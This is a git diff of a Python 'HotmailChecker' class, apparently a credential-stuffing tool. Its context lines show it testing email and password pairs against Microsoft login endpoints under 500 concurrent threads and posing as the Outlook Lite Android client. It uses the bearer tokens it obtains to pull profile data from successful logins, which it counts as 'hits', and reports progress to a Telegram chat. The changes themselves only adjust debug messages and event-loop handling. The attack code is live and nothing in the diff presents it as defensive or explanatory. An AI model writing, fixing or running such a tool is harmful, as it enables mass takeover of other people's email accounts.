@@ -26,28 +26,22 @@ class HotmailChecker:
         self.checked_accounts = set()
         self.rate_limit = threading.BoundedSemaphore(500)
         self.progress_message_id = None
-        print("[DEBUG] HotmailChecker initialized successfully")
+        print("[DEBUG] HotmailChecker initialized")
 
     def send_message(self, text, parse_mode='HTML'):
         print(f"[DEBUG] send_message called: {text[:80]}...")
         try:
-            # Robust event loop handling for background thread
-            try:
-                loop = asyncio.get_running_loop()
-            except RuntimeError:
-                loop = asyncio.new_event_loop()
-                asyncio.set_event_loop(loop)
-            
+            # Robust fix for Railway thread
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
             future = asyncio.run_coroutine_threadsafe(
                 self.bot.send_message(chat_id=self.chat_id, text=text, parse_mode=parse_mode),
                 loop
             )
             future.result(timeout=15)
             print("[DEBUG] send_message SUCCESS")
-            return True
         except Exception as e:
             print(f"[DEBUG] send_message FAILED: {e}")
-            return False
 
     def create_progress_bar(self, percentage, length=25):
         filled = int(length * percentage / 100)
@@ -97,7 +91,7 @@ class HotmailChecker:
                 self.linked_accounts[service_name] = self.linked_accounts.get(service_name, 0) + 1
 
     def get_capture(self, email, password, token, cid):
-        print(f"[DEBUG] get_capture started for {email}")
+        print(f"[DEBUG] get_capture for {email}")
         try:
             headers = {"User-Agent": "Outlook-Android/2.0", "Authorization": f"Bearer {token}", "X-AnchorMailbox": f"CID:{cid}"}
             response = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=25).json()
@@ -139,20 +133,18 @@ class HotmailChecker:
             with lock:
                 self.hit += 1
                 self.processed += 1
-            print(f"[DEBUG] HIT saved for {email}")
         except Exception as e:
             print(f"[DEBUG] get_capture FAILED: {e}")
             with lock:
                 self.processed += 1
 
     def check_account(self, email, password):
-        print(f"[DEBUG] check_account started for {email}")
+        print(f"[DEBUG] check_account for {email}")
         try:
             session = requests.Session()
             url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
             r1 = session.get(url1, headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9)"}, timeout=15)
             if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
-                print(f"[DEBUG] {email} → BAD")
                 return {"status": "BAD"}
 
             url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
@@ -198,7 +190,7 @@ class HotmailChecker:
         except requests.exceptions.Timeout:
             return {"status": "RETRY"}
         except Exception as e:
-            print(f"[DEBUG] check_account FAILED for {email}: {e}")
+            print(f"[DEBUG] check_account FAILED: {e}")
             return {"status": "RETRY"}
 
     def check_combo(self, email, password):
